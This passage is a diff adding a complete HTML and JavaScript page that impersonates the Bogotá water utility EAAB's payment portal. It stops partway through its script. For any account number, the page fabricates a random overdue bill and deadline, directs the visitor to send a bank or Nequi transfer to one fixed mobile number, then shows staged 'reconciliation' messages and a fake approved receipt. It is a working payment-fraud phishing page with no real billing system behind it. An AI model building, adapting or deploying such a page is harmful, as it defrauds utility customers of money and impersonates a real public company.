@@ -1,0 +1,554 @@
+<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>Portal de Pagos Virtuales | EAAB</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/><style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --azul:  #0D3B6E;
+    --azul2: #1A6BAA;
+    --azul3: #5BA3C9;
+    --agua:  #E8F4FB;
+    --blanco:#FFFFFF;
+    --fondo: #F4F7FA;
+    --borde: #D0DCE8;
+    --gris:  #6B7C93;
+    --verde: #1B7A45;
+    --vtenue:#E8F7EE;
+    --rojo:  #C0392B;
+    --rtenue:#FCE4D6;
+    --amarillo: #D35400;
+    --radio: 12px; --radioL: 20px;
+    --sombra: 0 4px 16px rgba(13,59,110,.12);
+  }
+  body { font-family:'Inter',sans-serif; background:var(--fondo); color:#1A2940; min-height:100vh; }
+
+  header { background:var(--azul); padding:0 24px; display:flex; align-items:center; justify-content:space-between; height:68px; box-shadow:0 2px 12px rgba(0,0,0,.25); position:sticky; top:0; z-index:100; }
+  .logo { display:flex; align-items:center; gap:12px; }
+  .logo img { height:45px; width:auto; object-fit:contain; }
+  .logo div { display:flex; flex-direction:column; }
+  .logo strong { color:#fff; font-size:15px; font-weight:700; line-height:1.2; }
+  .logo span { color:#8BB8D4; font-size:11px; }
+  .header-badge { background:rgba(255,255,255,.12); border:1px solid rgba(255,255,255,.2); color:#fff; font-size:11px; font-weight:600; padding:5px 12px; border-radius:20px; display:flex; align-items:center; gap:6px; }
+  .lock-icon { width: 12px; height: 12px; fill: #fff; }
+
+  .hero { background:linear-gradient(135deg,var(--azul) 0%,var(--azul2) 100%); padding:45px 24px 110px; text-align:center; position:relative; overflow:hidden; }
+  .hero::before { content:''; position:absolute; bottom:-2px; left:0; right:0; height:60px; background:var(--fondo); clip-path:ellipse(55% 100% at 50% 100%); }
+  
+  .hero-label { display:inline-block; background:rgba(255,255,255,.12); color:rgba(255,255,255,.9); font-size:11px; font-weight:600; letter-spacing:1.5px; text-transform:uppercase; padding:5px 14px; border-radius:20px; margin-bottom:14px; border: 1px solid rgba(255,255,255,0.1); }
+  .hero-title { color:#fff; font-size:clamp(24px,5vw,34px); font-weight:800; line-height:1.15; margin-bottom:10px; letter-spacing: -0.5px; }
+  .hero-sub { color:rgba(255,255,255,.75); font-size:14px; }
+
+  main { max-width:640px; margin:-70px auto 48px; padding:0 16px; position:relative; z-index:10; }
+
+  .steps { display:flex; align-items:center; background:var(--blanco); border-radius:var(--radioL); padding:18px 24px; margin-bottom:20px; box-shadow:var(--sombra); border: 1px solid rgba(13,59,110,0.05); }
+  .si { display:flex; align-items:center; gap:8px; flex:1; }
+  .sn { width:26px; height:26px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; flex-shrink:0; transition:all .3s; }
+  .sn.active{background:var(--azul2);color:#fff; box-shadow: 0 0 0 4px rgba(26,107,170,0.2);} .sn.done{background:var(--verde);color:#fff} .sn.pending{background:var(--borde);color:var(--gris)}
+  .sl { font-size:12px; font-weight:600; color:var(--gris); white-space:nowrap; }
+  .sl.active-label{color:var(--azul2); font-weight: 700;}
+  .sc { flex:1; height:2px; background:var(--borde); margin:0 12px; border-radius:2px; }
+  .sc.done{background:var(--verde)}
+
+  .card { background:var(--blanco); border-radius:var(--radioL); padding:32px; box-shadow:var(--sombra); margin-bottom:16px; display:none; border: 1px solid rgba(0,0,0,0.02); }
+  .card.active{display:block; animation: fadeIn 0.4s ease-out; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+  
+  .card-title { font-size:20px; font-weight:700; color:var(--azul); margin-bottom:4px; letter-spacing: -0.3px; }
+  .card-sub { font-size:13px; color:var(--gris); margin-bottom:24px; }
+
+  .field { margin-bottom:20px; }
+  .field label { display:block; font-size:11px; font-weight:700; color:var(--azul); margin-bottom:8px; letter-spacing:.5px; text-transform:uppercase; }
+  .field input { width:100%; padding:14px 16px; border:1.5px solid var(--borde); border-radius:var(--radio); font-family:inherit; font-size:16px; color:#1A2940; background:var(--blanco); outline:none; transition:all .2s; }
+  .field input:focus { border-color:var(--azul2); box-shadow:0 0 0 4px rgba(26,107,170,.1); background: #fff; }
+  .hint { font-size:11px; color:var(--gris); margin-top:6px; display:flex; align-items:center; gap:4px; }
+
+  .btn { width:100%; padding:16px; border:none; border-radius:var(--radio); font-family:inherit; font-size:15px; font-weight:700; cursor:pointer; transition:all .2s; display:flex; align-items:center; justify-content:center; gap:10px; }
+  .btn-primary { background:linear-gradient(135deg,var(--azul2),var(--azul)); color:#fff; box-shadow:0 4px 14px rgba(26,107,170,.3); }
+  .btn-primary:hover { transform:translateY(-1px); box-shadow:0 6px 20px rgba(26,107,170,.4); filter: brightness(1.05); }
+  .btn-primary:active { transform: translateY(1px); }
+  .btn-primary:disabled { opacity:.6; cursor:not-allowed; transform:none; }
+  .btn-secondary { background:transparent; border:1.5px solid var(--borde); color:var(--gris); margin-top:12px; }
+  .btn-secondary:hover { background:var(--fondo); color: var(--azul); border-color: var(--azul3); }
+
+  /* ESTADOS DE CARGA INTERMEDIOS */
+  .loading-box { display: none; text-align: center; padding: 40px 20px; }
+  .loading-text { font-size: 14px; font-weight: 600; color: var(--azul); margin-top: 16px; }
+
+  .inv-header { background:var(--agua); border:1.5px solid #C2DFF0; border-radius:var(--radio); padding:16px 20px; margin-bottom:20px; display:flex; align-items:center; gap:14px; }
+  .inv-icon { width:44px; height:44px; background:var(--azul2); border-radius:10px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+  .inv-icon svg { fill:#fff; width:22px; }
+  .inv-meta strong { font-size:15px; font-weight:700; color:var(--azul); display:block; letter-spacing: -0.2px; }
+  .inv-meta span { font-size:12px; color:var(--gris); }
+  
+  .inv-rows { margin-bottom:20px; background: #FFF; border: 1px solid var(--borde); border-radius: var(--radio); padding: 6px 16px; }
+  .inv-row { display:flex; justify-content:space-between; padding:12px 0; border-bottom:1px solid #Ebf0f6; font-size:13.5px; }
+  .inv-row:last-child{border-bottom:none}
+  .inv-row .l { color:var(--gris); font-weight: 500; } 
+  .inv-row .v { font-weight:600; color: #2C3E50; }
+  .inv-row .v.alerta { color: var(--rojo); background: var(--rtenue); padding: 2px 8px; border-radius: 6px; font-size: 12px; font-weight: 700; }
+  
+  .inv-total { background: linear-gradient(135deg, var(--azul), #08284C); border-radius:var(--radio); padding:18px 22px; display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; box-shadow: 0 4px 12px rgba(13,59,110,0.15); }
+  .inv-total .l{color:rgba(255,255,255,.8);font-size:13px; font-weight: 500;} .inv-total .v{color:#fff;font-size:26px;font-weight:800; letter-spacing: -0.5px;}
+
+  /* SELECCIÓN BANCOS */
+  .metodos-grid { display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:20px; }
+  .metodo-btn {
+    border:2px solid var(--borde); border-radius:var(--radio); padding:14px 10px;
+    background:var(--blanco); cursor:pointer; transition:all 0.2s ease;
+    display:flex; flex-direction:column; align-items:center; gap:6px; font-family:inherit;
+  }
+  .metodo-btn:hover { border-color:var(--azul3); transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+  .metodo-btn.selected { border-color:var(--azul2); background:var(--agua); box-shadow:0 0 0 3px rgba(26,107,170,.15); transform: none; }
+  .metodo-btn .mb-icon { font-size:24px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.05)); }
+  .metodo-btn .mb-name { font-size:13px; font-weight:700; color:var(--azul); text-align: center; }
+  .metodo-btn .mb-sub { font-size:10px; color:var(--gris); text-align: center; }
+
+  /* INSTRUCCIONES LLAVE */
+  .pago-panel { background:#F4F8FC; border:1.5px solid #D2E4F3; border-radius:var(--radioL); padding:22px; margin-bottom:22px; }
+  .pago-panel-title { font-size:15px; font-weight:700; color:var(--azul); margin-bottom:4px; }
+  .pago-panel-sub { font-size:12px; color:var(--gris); margin-bottom:16px; }
+  .pago-dato { background:var(--blanco); border:1.5px solid var(--borde); border-radius:var(--radio); padding:14px 18px; display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; box-shadow: 0 2px 6px rgba(0,0,0,0.02); }
+  .pd-label { font-size:11px; font-weight:600; color:var(--gris); text-transform:uppercase; letter-spacing:.5px; margin-bottom:3px; }
+  .pd-value { font-size:20px; font-weight:800; color:var(--azul); letter-spacing:0.5px; }
+  
+  .copy-btn { background:var(--fondo); border:1.5px solid var(--borde); color:var(--azul2); font-size:12px; font-weight:700; padding:8px 14px; border-radius:8px; cursor:pointer; transition:all .2s; }
+  .copy-btn:hover { background:var(--agua); border-color: var(--azul3); }
+  .copy-btn.copiado { background:var(--vtenue); border-color:var(--verde); color:var(--verde); }
+
+  .pago-steps { margin-top:14px; }
+  .pago-step { display:flex; gap:12px; align-items:flex-start; padding:10px 0; border-bottom:1px solid #E6EEF5; }
+  .pago-step:last-child{border-bottom:none}
+  .ps-num { width:22px; height:22px; border-radius:50%; background:var(--azul2); color:#fff; font-size:11px; font-weight:700; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+  .ps-text { font-size:13px; line-height:1.45; color: #34495E; }
+  .ps-text strong { color:var(--azul); font-weight: 600; }
+
+  /* CHECKBOX ESTILIZADO */
+  .confirmacion-envio { background: #FFFDF3; border: 1.5px solid #F1E5C2; border-radius: var(--radio); padding:16px; margin-bottom:22px; display:flex; align-items:flex-start; gap:12px; cursor:pointer; transition: background 0.2s; }
+  .confirmacion-envio:hover { background: #FFFCEB; }
+  .confirmacion-envio input { width:19px; height:19px; margin-top:1px; cursor:pointer; accent-color: var(--azul2); }
+  .confirmacion-envio label { font-size:13px; color: #7F5A00; font-weight:600; line-height:1.45; cursor:pointer; user-select:none; }
+
+  /* OVERLAY DE PROCESAMIENTO SEGURO */
+  .overlay-procesando { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(13, 59, 110, 0.96); z-index: 200; align-items: center; justify-content: center; flex-direction: column; color: #fff; text-align: center; padding: 20px; }
+  .overlay-spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.15); border-top-color: var(--azul3); border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px; }
+  .overlay-titulo { font-size: 20px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.3px; }
+  .overlay-sub { font-size: 13px; color: #A9CBE2; max-width: 320px; line-height: 1.5; }
+
+  /* TOAST DE ERROR NOTIFICACIÓN */
+  .toast-alert { position: fixed; top: 24px; right: 24px; background: #1A2940; color: #fff; padding: 16px 24px; border-radius: var(--radio); box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 300; display: flex; align-items: center; gap: 12px; font-size: 13.5px; font-weight: 600; border-left: 4px solid #E74C3C; transform: translateY(-100px); opacity: 0; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+  .toast-alert.show { transform: translateY(0); opacity: 1; }
+
+  /* PASO 3: EXITO COMPROBANTE */
+  .ok-icon { width:76px; height:76px; background:var(--vtenue); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px; box-shadow: 0 4px 10px rgba(27,122,69,0.1); }
+  .ok-icon svg { width:38px; fill:var(--verde); }
+  .ok-title { text-align:center; font-size:23px; font-weight:800; color:var(--azul); margin-bottom:6px; letter-spacing: -0.5px; }
+  .ok-sub { text-align:center; font-size:14px; color:var(--gris); margin-bottom:28px; }
+  
+  .receipt { background:var(--fondo); border: 1px solid var(--borde); border-radius:var(--radio); padding:20px; margin-bottom:24px; }
+  .rrow { display:flex; justify-content:space-between; font-size:13.5px; padding:9px 0; border-bottom:1px dashed var(--borde); }
+  .rrow:last-child{border-bottom:none}
+  .rrow .rl{color:var(--gris)} .rrow .rv{font-weight:600; color: #2C3E50;}
+
+  .tag-ok { display:inline-block; background:var(--vtenue); color:var(--verde); font-size:11px; font-weight:600; padding:4px 10px; border-radius:20px; text-transform: uppercase; letter-spacing: 0.3px; }
+
+  .spinner { width:18px; height:18px; border:2.5px solid rgba(255,255,255,.3); border-top-color:#fff; border-radius:50%; animation:spin .7s linear infinite; display:none; }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .seguridad { display:flex; align-items:center; justify-content:center; gap:20px; flex-wrap:wrap; padding:18px 0 0; border-top:1px solid var(--borde); margin-top:24px; }
+  .seg-badge { display:flex; align-items:center; gap:6px; font-size:11.5px; color:var(--gris); font-weight:600; }
+  .seg-dot { width:7px; height:7px; border-radius:50%; background:var(--verde); }
+
+  footer { text-align:center; padding:32px 24px; font-size:12px; color:var(--gris); line-height: 1.5; }
+
+  @media(max-width:480px){
+    header{padding:0 16px} .hero{padding:35px 16px 95px} .card{padding:24px 18px}
+    .metodos-grid{grid-template-columns:1fr 1fr}
+    .toast-alert { left: 16px; right: 16px; top: 16px; }
+  }</style></head><body><div class="toast-alert" id="custom-toast">
+  <span style="font-size: 18px;">⚠️</span>
+  <span id="toast-msg">Mensaje de validación del sistema</span></div><div class="overlay-procesando" id="payment-overlay">
+  <div class="overlay-spinner"></div>
+  <div class="overlay-titulo" id="overlay-step-title">Conectando con la Pasarela</div>
+  <div class="overlay-sub" id="overlay-step-sub">Estableciendo enlace seguro de auditoría criptográfica...</div></div><header>
+  <div class="logo">
+    <img src="images (2).png" alt="Logo Acueducto de Bogotá"/>
+    <div>
+      <strong>Portal de Pagos Virtuales</strong>
+      <span>EAAB Sistema Corporativo</span>
+    </div>
+  </div>
+  <div class="header-badge">
+    <svg class="lock-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+    <span>Cifrado SSL 256-bit</span>
+  </div></header><div class="hero">
+  <span class="hero-label">Recaudo Oficial Electrónico</span>
+  <h1 class="hero-title">Sistema de Pago Inmediato por Llave</h1>
+  <p class="hero-sub">Consulte su saldo pendiente y efectúe su transferencia en pocos pasos</p></div><main>
+  <div class="steps">
+    <div class="si">
+      <div id="sn1" class="sn active">1</div>
+      <span class="sl active-label">Consulta</span>
+    </div>
+    <div id="sc1" class="sc"></div>
+    <div class="si">
+      <div id="sn2" class="sn pending">2</div>
+      <span class="sl">Liquidación</span>
+    </div>
+    <div id="sc2" class="sc"></div>
+    <div class="si">
+      <div id="sn3" class="sn pending">3</div>
+      <span class="sl">Comprobante</span>
+    </div>
+  </div>
+
+  <div id="loading-consulta" class="card loading-box">
+    <div class="overlay-spinner" style="margin: 0 auto; border-top-color: var(--azul2);"></div>
+    <div class="loading-text" id="loading-txt-dinamico">Conectando al servidor central...</div>
+  </div>
+
+  <div id="card-paso1" class="card active">
+    <h2 class="card-title">Localizar Obligación</h2>
+    <p class="card-sub">Ingrese el identificador único de su factura de acueducto</p>
+    
+    <div class="field">
+      <label for="numero_cuenta">Cuenta Contrato / Referencia de Pago</label>
+      <input type="number" id="numero_cuenta" placeholder="Ej. 10485938" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')"/>
+      <div class="hint">
+        <svg style="width:13px; fill:var(--gris);" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+        Ubicado en el recuadro azul superior de su factura impresa.
+      </div>
+    </div>
+
+    <button type="button" class="btn btn-primary" id="btn-consultar">
+      <span>Buscar Factura</span>
+      <div class="spinner" id="spin-consultar"></div>
+    </button>
+  </div>
+
+  <div id="card-paso2" class="card">
+    <h2 class="card-title">Detalle de Liquidación Actual</h2>
+    <p class="card-sub">Verifique que los montos e identificadores sean los correctos</p>
+
+    <div class="inv-header">
+      <div class="inv-icon">
+        <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+      </div>
+      <div class="inv-meta">
+        <strong id="inv-usuario">--</strong>
+        <span id="inv-referencia">--</span>
+      </div>
+    </div>
+
+    <div class="inv-rows">
+      <div class="inv-row"><span class="l">Tipo de Servicio</span><span class="v">Acueducto y Alcantarillado</span></div>
+      <div class="inv-row"><span class="l">Dirección de Predio</span><span class="v" id="inv-direccion">Bogotá D.C. - Zona Urbana</span></div>
+      <div class="inv-row"><span class="l">Estado de Cuenta</span><span class="v alerta" id="inv-estado">PENDIENTE / VENCIDO</span></div>
+      <div class="inv-row"><span class="l">Mora Registrada</span><span class="v" id="inv-retraso" style="color: var(--rojo); font-weight: 700;">Atraso de 3 días</span></div>
+      <div class="inv-row"><span class="l">Fecha Límite Pasada</span><span class="v" id="inv-vencimiento" style="text-decoration: line-through; color: var(--gris);">--</span></div>
+      <div class="inv-row"><span class="l">Radicado Liquidación</span><span class="v" id="inv-radicado" style="font-family: monospace;">--</span></div>
+    </div>
+
+    <div class="inv-total">
+      <span class="l">Monto total con recargo</span>
+      <span class="v" id="inv-total-val">$ 0.00</span>
+    </div>
+
+    <h3 style="font-size:13px; font-weight:700; color:var(--azul); margin-bottom:12px; text-transform:uppercase; letter-spacing:.5px">Seleccione su entidad bancaria</h3>
+    
+    <div class="metodos-grid">
+      <button type="button" class="metodo-btn selected" data-metodo="bancolombia">
+        <span class="mb-icon">🏦</span>
+        <span class="mb-name">Bancolombia</span>
+        <span class="mb-sub">App Personas / A la mano</span>
+      </button>
+      <button type="button" class="metodo-btn" data-metodo="nequi">
+        <span class="mb-icon">📱</span>
+        <span class="mb-name">Nequi</span>
+        <span class="mb-sub">Plataforma Directa</span>
+      </button>
+      <button type="button" class="metodo-btn" data-metodo="davivienda">
+        <span class="mb-icon">🔴</span>
+        <span class="mb-name">Davivienda</span>
+        <span class="mb-sub">Daviplata / App</span>
+      </button>
+      <button type="button" class="metodo-btn" data-metodo="bbva">
+        <span class="mb-icon">💙</span>
+        <span class="mb-name">BBVA Colombia</span>
+        <span class="mb-sub">BBVA Móvil</span>
+      </button>
+      <button type="button" class="metodo-btn" data-metodo="bancobogota">
+        <span class="mb-icon">🟡</span>
+        <span class="mb-name">Banco de Bogotá</span>
+        <span class="mb-sub">Banca Móvil</span>
+      </button>
+      <button type="button" class="metodo-btn" data-metodo="scotiabank">
+        <span class="mb-icon">⛨</span>
+        <span class="mb-name">Scotiabank Colpatria</span>
+        <span class="mb-sub">Banca Virtual</span>
+      </button>
+    </div>
+
+    <div class="pago-panel">
+      <h4 class="pago-panel-title" id="panel-titulo">Llave Autorizada de Recaudo</h4>
+      <p class="pago-panel-sub">Copie la siguiente llave maestra e ingrésela como destinatario en su canal bancario:</p>
+      
+      <div class="pago-dato">
+        <div>
+          <div class="pd-label" id="pd-label-dinamico">Número de Llave Oficial</div>
+          <div class="pd-value" id="val-llave-pago">3219044971</div>
+        </div>
+        <button type="button" class="copy-btn" onclick="copiarTexto('val-llave-pago', this)">Copiar</button>
+      </div>
+
+      <div class="pago-steps" id="panel-instrucciones">
+        <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Transfiere desde tu App Personas Bancolombia usando la opción de transferencia a celular con el número: <strong>3219044971</strong>.</div></div>
+        <div class="pago-step"><div class="ps-num">2</div><div class="ps-text">Digita el monto exacto detallado en la liquidación actual.</div></div>
+      </div>
+    </div>
+
+    <div class="confirmacion-envio" id="wrapper-checkbox">
+      <input type="checkbox" id="chk-pago-realizado"/>
+      <label for="chk-pago-realizado">Declaro bajo registro que ya efectué de forma correcta el envío por la cantidad exacta usando la llave oficial.</label>
+    </div>
+
+    <button type="button" class="btn btn-primary" id="btn-reportar">
+      <span>Confirmar Transacción y Registrar Pago</span>
+    </button>
+    <button type="button" class="btn btn-secondary" id="btn-volver1">Modificar Consulta</button>
+  </div>
+
+  <div id="card-paso3" class="card">
+    <div class="ok-icon">
+      <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+    </div>
+    <h2 class="ok-title">Comprobante de Pago Electrónico</h2>
+    <p class="ok-sub">La transacción ha sido conciliada e ingresada al sistema de cartera de la EAAB</p>
+
+    <div class="receipt">
+      <div class="rrow"><span class="rl">Estado de Transacción</span><span class="rv tag-ok">Aprobado / Conciliado</span></div>
+      <div class="rrow"><span class="rl">Código Único de Seguimiento (CUS)</span><span class="rv" id="rec-id" style="font-family: monospace; font-weight:700;">--</span></div>
+      <div class="rrow"><span class="rl">Llave Destino Utilizada</span><span class="rv" id="rec-ref">3219044971</span></div>
+      <div class="rrow"><span class="rl">Entidad de Origen</span><span class="rv" id="rec-medio">--</span></div>
+      <div class="rrow"><span class="rl">Valor Total Auditado</span><span class="rv" id="rec-monto" style="color: var(--verde); font-weight:700;">--</span></div>
+      <div class="rrow"><span class="rl">Fecha de Procesamiento</span><span class="rv" id="rec-fecha">--</span></div>
+    </div>
+
+    <p style="font-size:12px;color:var(--gris);text-align:center;line-height:1.6;margin-bottom:24px">
+      Este documento sirve como soporte legal digital de recaudo. Los cambios se verán reflejados en su próximo ciclo de facturación física.
+    </p>
+
+    <button type="button" class="btn btn-primary" id="btn-finalizar">Descargar y Salir</button>
+  </div>
+
+  <div class="seguridad">
+    <div class="seg-badge"><div class="seg-dot"></div> Servidor de Autenticación Activo</div>
+    <div class="seg-badge">🏦 Vigilado por Superfinanciera</div>
+    <div class="seg-badge">🛡️ Red Transfiya Homologada</div>
+  </div></main><footer>
+  <p>Empresa de Acueducto y Alcantarillado de Bogotá ESP<br>
+  NIT: 899.999.081-1 | Pasarela Segura Integrada 2026.</p></footer><script>
+  let facturaActual = null;
+  let metodoSeleccionado = "Bancolombia";
+  const LLAVE_FIJA = "3219044971";
+
+  const btnConsultar = document.getElementById('btn-consultar');
+  const btnReportar = document.getElementById('btn-reportar');
+  const btnVolver1 = document.getElementById('btn-volver1');
+  const btnFinalizar = document.getElementById('btn-finalizar');
+  const chkPagoRealizado = document.getElementById('chk-pago-realizado');
+
+  const cardPaso1 = document.getElementById('card-paso1');
+  const cardPaso2 = document.getElementById('card-paso2');
+  const cardPaso3 = document.getElementById('card-paso3');
+  const loadingConsulta = document.getElementById('loading-consulta');
+
+  function showToast(mensaje) {
+    const toast = document.getElementById('custom-toast');
+    document.getElementById('toast-msg').innerText = mensaje;
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); }, 4000);
+  }
+
+  function switchPaso(pasoActivo) {
+    [cardPaso1, cardPaso2, cardPaso3, loadingConsulta].forEach(c => c.style.display = 'none');
+    
+    ['1', '2', '3'].forEach(p => {
+      const sn = document.getElementById(`sn${p}`);
+      if(sn) {
+        sn.classList.remove('active', 'done', 'pending');
+        if(p < pasoActivo) sn.classList.add('done');
+        else if(p == pasoActivo) sn.classList.add('active');
+        else sn.classList.add('pending');
+      }
+      const sc = document.getElementById(`sc${p}`);
+      if(sc) {
+        sc.classList.remove('done');
+        if(p < pasoActivo) sc.classList.add('done');
+      }
+    });
+
+    if(pasoActivo === 1) cardPaso1.style.display = 'block';
+    if(pasoActivo === 2) cardPaso2.style.display = 'block';
+    if(pasoActivo === 3) cardPaso3.style.display = 'block';
+    
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  }
+
+  function generarValorAleatorio() {
+    const min = 90000;
+    const max = 180000;
+    const monto = Math.floor(Math.random() * (max - min + 1)) + min;
+    return "$ " + monto.toLocaleString('es-CO') + ".00";
+  }
+
+  function generarRadicado() {
+    return "RAD-" + Math.floor(Math.random() * 8999999 + 1000000);
+  }
+
+  function obtenerFechaVencimientoPasada() {
+    const fecha = new Date();
+    fecha.setDate(fecha.getDate() - 3);
+    const opciones = { day: 'numeric', month: 'long', year: 'numeric' };
+    return fecha.toLocaleDateString('es-CO', opciones);
+  }
+
+  btnConsultar.addEventListener('click', () => {
+    const cuenta = document.getElementById('numero_cuenta').value.trim();
+    if(!cuenta) { 
+      showToast("Debe proporcionar un número de cuenta contrato válido."); 
+      return; 
+    }
+    
+    cardPaso1.style.display = 'none';
+    loadingConsulta.style.display = 'block';
+    
+    const txtCarga = document.getElementById('loading-txt-dinamico');
+    
+    setTimeout(() => { txtCarga.innerText = "Localizando expediente de cartera..."; }, 600);
+    setTimeout(() => { txtCarga.innerText = "Calculando saldo consolidado e intereses de mora..."; }, 1200);
+
+    setTimeout(() => {
+      loadingConsulta.style.display = 'none';
+      chkPagoRealizado.checked = false;
+
+      facturaActual = {
+        usuario: "CUENTA CONTRATO: " + cuenta,
+        vencimiento: obtenerFechaVencimientoPasada(),
+        total: generarValorAleatorio(),
+        radicado: generarRadicado(),
+        ref: "OBL-" + cuenta
+      };
+
+      document.getElementById('inv-usuario').innerText = facturaActual.usuario;
+      document.getElementById('inv-referencia').innerText = `Referencia Interna: ${facturaActual.ref}`;
+      document.getElementById('inv-vencimiento').innerText = facturaActual.vencimiento;
+      document.getElementById('inv-radicado').innerText = facturaActual.radicado;
+      document.getElementById('inv-total-val').innerText = facturaActual.total;
+      
+      document.getElementById('val-llave-pago').innerText = LLAVE_FIJA;
+
+      switchPaso(2);
+    }, 2000);
+  });
+
+  document.querySelectorAll('.metodo-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      document.querySelectorAll('.metodo-btn').forEach(b => b.classList.remove('selected'));
+      this.classList.add('selected');
+      
+      const metodo = this.getAttribute('data-metodo');
+      metodoSeleccionado = this.querySelector('.mb-name').innerText;
+      
+      const tituloPanel = document.getElementById('panel-titulo');
+      const labelDinamico = document.getElementById('pd-label-dinamico');
+      const instrucciones = document.getElementById('panel-instrucciones');
+
+      if(metodo === 'nequi') {
+        tituloPanel.innerText = "Pasarela Destino Nequi";
+        labelDinamico.innerText = "Número celular de convenio";
+        instrucciones.innerHTML = `
+          <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Abre tu App Nequi, ve a la opción 'Enviar Plata' e ingresa la llave celular destino: <strong>${LLAVE_FIJA}</strong>.</div></div>
+          <div class="pago-step"><div class="ps-num">2</div><div class="ps-text">Digita el monto exacto detallado en la liquidación actual.</div></div>
+        `;
+      } else if (metodo === 'davivienda') {
+        tituloPanel.innerText = "Pasarela Destino Daviplata / Davivienda";
+        labelDinamico.innerText = "Celular de Llave Transfiya";
+        instrucciones.innerHTML = `
+          <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Realiza la transferencia Express o vía Daviplata usando la opción 'Enviar Plata' al celular: <strong>${LLAVE_FIJA}</strong>.</div></div>
+        `;
+      } else if (metodo === 'bbva') {
+        tituloPanel.innerText = "Pasarela Destino BBVA";
+        labelDinamico.innerText = "Llave móvil homologada";
+        instrucciones.innerHTML = `
+          <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Desde tu App BBVA Móvil, selecciona transferencias mediante número de celular/contacto e ingresa el número: <strong>${LLAVE_FIJA}</strong>.</div></div>
+        `;
+      } else if (metodo === 'bancobogota') {
+        tituloPanel.innerText = "Pasarela Destino Banco de Bogotá";
+        labelDinamico.innerText = "Llave celular de recaudo";
+        instrucciones.innerHTML = `
+          <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Ingresa a tu Banca Móvil de Banco de Bogotá, elige transferir a celular (Red Transfiya) y escribe: <strong>${LLAVE_FIJA}</strong>.</div></div>
+        `;
+      } else if (metodo === 'scotiabank') {
+        tituloPanel.innerText = "Pasarela Destino Scotiabank Colpatria";
+        labelDinamico.innerText = "Llave celular receptora";
+        instrucciones.innerHTML = `
+          <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Desde la app de Colpatria, usa la funcionalidad de envíos inmediatos de dinero a celular digitando: <strong>${LLAVE_FIJA}</strong>.</div></div>
+        `;
+      } else {
+        tituloPanel.innerText = "Pasarela Destino Bancolombia";
+        labelDinamico.innerText = "Llave celular receptora";
+        instrucciones.innerHTML = `
+          <div class="pago-step"><div class="ps-num">1</div><div class="ps-text">Transfiere desde tu App Personas Bancolombia usando la opción de transferencia a celular con el número: <strong>${LLAVE_FIJA}</strong>.</div></div>
+          <div class="pago-step"><div class="ps-num">2</div><div class="ps-text">Verifica que el monto digitado corresponda al total de la liquidación actual.</div></div>
+        `;
+      }
+    });
+  });
+
+  btnReportar.addEventListener('click', () => {
+    if (!chkPagoRealizado.checked) {
+      showToast("Debe completar la transferencia en su banco y confirmar marcando la casilla obligatoria.");
+      return;
+    }
+
+    const overlay = document.getElementById('payment-overlay');
+    const oTitle = document.getElementById('overlay-step-title');
+    const oSub = document.getElementById('overlay-step-sub');
+
+    overlay.style.display = 'flex';
+
+    setTimeout(() => {
+      oTitle.innerText = "Localizando Transferencia...";
+      oSub.innerText = "Rastreando transacciones entrantes hacia la llave 3219044971...";
+    }, 1000);
+
+    setTimeout(() => {
+      oTitle.innerText = "Conciliando Fondos...";
+      oSub.innerText = "Verificando firmas, liquidación vencida y montos con la red interbancaria central...";
+    }, 2500);
+
+    setTimeout(() => {
+      overlay.style.display = 'none';
+      
+      const ahora = new Date();
+      document.getElementById('rec-id').innerText = 'CUS-' + Math.floor(Math.random() * 8999999 + 1000000);
+      document.getElementById('rec-medio').innerText = metodoSeleccionado;
+      document.getElementById('rec-monto').innerText = facturaActual.total;
